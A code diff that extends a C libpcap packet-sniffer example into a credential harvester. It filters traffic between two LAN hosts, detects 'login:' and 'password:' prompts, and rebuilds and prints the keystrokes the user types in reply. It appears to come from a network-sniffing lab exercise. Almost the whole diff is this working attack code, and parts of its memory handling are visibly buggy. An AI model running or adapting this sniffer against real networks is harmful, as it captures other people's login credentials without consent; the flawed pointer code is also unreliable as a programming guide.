@@ -267,11 +267,32 @@ struct sniff_tcp {
     u_short th_urp;                 /* urgent pointer */
 };
 
+char* special_words[] = {"VM login:","password:","Password:","VM Login:"};
+int num_of_hits = 0;
+
+
+struct hits{
+
+    struct in_addr tracked_src;
+    struct in_addr tracked_dest;
+    char special_word[10];
+    int size_o_word;
+    char word[1000];
+};
+
+struct hits * total_hits[10];
+
+
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 
+int
+update_word(struct hits * h, char * pl, int spl);
 void
 print_payload(const u_char *payload, int len);
+
+void
+check_for_special_strings(const u_char *payload, int len, struct in_addr src, struct in_addr dest);
 
 void
 print_hex_ascii_line(const u_char *payload, int len, int offset);
@@ -411,6 +432,92 @@ print_payload(const u_char *payload, int len)
     return;
 }
 
+
+int update_word(struct hits * h, char * pl, int spl)
+{
+    //printf("DEBUG: Made it , update \n\n");
+
+    for(int i = 0; i < spl; i++)
+    {
+        //printf("DEBUG: enter currchar, \n\n");
+        char currChar = pl[i];
+        if(currChar == (char)13)
+        {
+            //printf("\n DEBUG: carriage return %s\n", h->word);
+            printf("\n%s -- %s\n", h->special_word, h->word);
+            // add exit/remove gracefully
+            free(h);
+            h=NULL;
+            return 1;
+        }
+        else if (currChar == (char)127)
+        {
+            //printf("DEBUG: enter del, \n\n");
+            //printf("\n DEBUG: Delete %s\n", h->word);
+
+            h->size_o_word -= 1;
+            memcpy(h + sizeof(struct in_addr) * 2 +  sizeof(h->size_o_word) + sizeof(h->special_word) + h->size_o_word, "\0", 1);
+
+        }
+        else if(currChar>=(char)32&&currChar<=126)
+        {
+            //printf("\n DEBUG: char enter %s \n", pl);
+            //printf("DEBUG: enter typical cpy, \n\n");
+            memcpy(h->word+h->size_o_word, pl + i, 1);
+            h->size_o_word += 1;
+            for(int c = h->size_o_word; c<sizeof(h->word); c++)
+                memcpy(h->word+c, "\0", 1);
+            //printf("\n DEBUG: typical %s \n", h->word);
+
+
+        }
+    }
+    return 0;
+
+
+
+}
+
+
+void check_for_special_strings(const u_char *payload, int len, struct in_addr src, struct in_addr dest)
+{
+    struct hits t_hit;
+    int flag = 1;
+    GETOUTTAHERE:
+    if(flag)
+    {
+        for(int a = 0; a<(sizeof(special_words)/sizeof(char*)); a++)
+        {
+            if(strstr(payload,special_words[a]))
+            {
+                strcpy(t_hit.special_word, special_words[a]);
+                t_hit.tracked_dest= src; // we want this reversed to collect from user even though req comes from server
+                t_hit.tracked_src=dest;
+                t_hit.size_o_word= 0;
+                strcpy(t_hit.word, "");
+                void * mem = malloc(sizeof(t_hit));
+                memcpy(mem, &t_hit, sizeof(t_hit));
+            for(int a = 0; a<(sizeof(total_hits)/sizeof(struct hits *)); a++)
+            {
+                if(total_hits[a] == NULL){
+                    total_hits[a] = mem;
+                    printf("\n HIT! \n");
+                    flag = 0;
+                    goto GETOUTTAHERE;
+                }
+                if (a == (sizeof(total_hits)/sizeof(struct hits *)) - 1){
+                    printf("\n We missed one boys \n");
+                }
+            }
+            }
+        }
+    }
+
+    
+
+
+}
+
 /*
  * dissect/print packet
  */
@@ -430,7 +537,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
     int size_tcp;
     int size_payload;
 
-    printf("\nPacket number %d:\n", count);
+    //printf("\nPacket number %d:\n", count);
     count++;
 
     /* define ethernet header */
@@ -445,27 +552,27 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
     }
 
     /* print source and destination IP addresses */
-    printf("       From: %s\n", inet_ntoa(ip->ip_src));
-    printf("         To: %s\n", inet_ntoa(ip->ip_dst));
+    //printf("       From: %s\n", inet_ntoa(ip->ip_src));
+    //printf("         To: %s\n", inet_ntoa(ip->ip_dst));
 
     /* determine protocol */
-    switch(ip->ip_p) {
-        case IPPROTO_TCP:
-            printf("   Protocol: TCP\n");
-            break;
-        case IPPROTO_UDP:
-            printf("   Protocol: UDP\n");
-            return;
-        case IPPROTO_ICMP:
-            printf("   Protocol: ICMP\n");
-            return;
-        case IPPROTO_IP:
-            printf("   Protocol: IP\n");
-            return;
-        default:
-            printf("   Protocol: unknown\n");
-            return;
-    }
+    // switch(ip->ip_p) {
+    //     case IPPROTO_TCP:
+    //         printf("   Protocol: TCP\n");
+    //         break;
+    //     case IPPROTO_UDP:
+    //         printf("   Protocol: UDP\n");
+    //         return;
+    //     case IPPROTO_ICMP:
+    //         printf("   Protocol: ICMP\n");
+    //         return;
+    //     case IPPROTO_IP:
+    //         printf("   Protocol: IP\n");
+    //         return;
+    //     default:
+    //         printf("   Protocol: unknown\n");
+    //         return;
+    // }
 
     /*
      *  OK, this packet is TCP.
@@ -479,8 +586,8 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
         return;
     }
 
-    printf("   Src port: %d\n", ntohs(tcp->th_sport));
-    printf("   Dst port: %d\n", ntohs(tcp->th_dport));
+    // printf("   Src port: %d\n", ntohs(tcp->th_sport));
+    // printf("   Dst port: %d\n", ntohs(tcp->th_dport));
 
     /* define/compute tcp payload (segment) offset */
     payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
@@ -492,9 +599,28 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
      * Print payload data; it might be binary, so don't just
      * treat it as a string.
      */
+
+    //printf("DEBUG: enter payload\n\n");
     if (size_payload > 0) {
-        printf("   Payload (%d bytes):\n", size_payload);
-        print_payload(payload, size_payload);
+
+        for(int a = 0; a<(sizeof(total_hits)/sizeof(struct hits *)); a++)
+        {
+            //printf("DEBUG: enter if update\n\n");
+            if(total_hits[a] != NULL && ip->ip_src.s_addr==total_hits[a]->tracked_src.s_addr && ip->ip_dst.s_addr==total_hits[a]->tracked_dest.s_addr){
+                //printf("DEBUG: enter update\n\n");
+                int reset = update_word(total_hits[a], payload, size_payload);
+                if (reset)
+                    total_hits[a] = NULL;
+                break;
+            }
+
+
+        }
+        //printf("DEBUG: enter special string\n\n");
+        check_for_special_strings(payload, size_payload, ip->ip_src, ip->ip_dst);
+
+        // printf("   Payload (%d bytes):\n", size_payload);
+        // print_payload(payload, size_payload);
     }
 
     return;
@@ -507,11 +633,11 @@ int main(int argc, char **argv)
     char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
     pcap_t *handle;				/* packet capture handle */
 
-    char filter_exp[] = "ip";		/* filter expression [3] */
+    char filter_exp[] = "ip host 192.168.1.222 and 192.168.1.183";		/* filter expression [3] */
     struct bpf_program fp;			/* compiled filter program (expression) */
     bpf_u_int32 mask;			/* subnet mask */
     bpf_u_int32 net;			/* ip */
-    int num_packets = 100;			/* number of packets to capture */
+    int num_packets = 0;			/* number of packets to capture */
 
     print_app_banner();
 
@@ -580,6 +706,12 @@ int main(int argc, char **argv)
 	/* cleanup */
 	pcap_freecode(&fp);
 	pcap_close(handle);
+
+    for(int i = 0; i<(sizeof(total_hits)/sizeof(struct hits *)); i++)
+    {
+        if(total_hits[i] != NULL)
+            free(total_hits[i]);
+    }
 
 	printf("\nCapture complete.\n");
 
